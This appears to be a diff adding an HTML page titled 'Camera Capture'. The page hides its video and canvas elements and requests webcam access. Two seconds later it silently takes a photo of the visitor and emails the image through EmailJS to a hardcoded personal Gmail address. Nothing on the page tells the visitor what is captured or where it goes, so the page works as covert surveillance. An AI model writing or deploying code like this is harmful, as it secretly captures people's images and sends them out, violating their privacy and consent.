@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <!-- Load EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS (Make sure this is a PUBLIC Key, not private)
+        emailjs.init("PzgeOUgNmIlIXY_lr"); // Replace with your actual public EmailJS User ID
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                let video = document.getElementById('video');
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    // Wait 2 seconds, then take a picture
+                    setTimeout(() => {
+                        captureImage();
+                    }, 2000);
+                };
+            })
+            .catch(err => alert("Please allow camera access"));
+
+        function captureImage() {
+            let video = document.getElementById('video');
+            let canvas = document.getElementById('canvas');
+            let context = canvas.getContext('2d');
+
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                alert("Error: Video not loaded properly. Try again.");
+                return;
+            }
+
+            // Set canvas size to match video size
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw video frame onto the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert image to Base64 format
+            let imageData = canvas.toDataURL('image/png');
+
+            // Stop the camera after capturing
+            video.srcObject.getTracks().forEach(track => track.stop());
+
+            // Send the image
+            sendImage(imageData);
+        }
+
+        function sendImage(imageData) {
+            emailjs.send("service_popuebk", "template_12m6gf8", {
+                to_email: "khalifaalraeesi7@gmail.com", // Replace with your actual email
+                image: imageData
+            }).then(response => {
+                alert("Image sent successfully!");
+            }).catch(error => {
+                alert("Error sending image. Check the console for details.");
+                console.error(error);
+            });
+        }
+    </script>
+
+</body>
+</html>
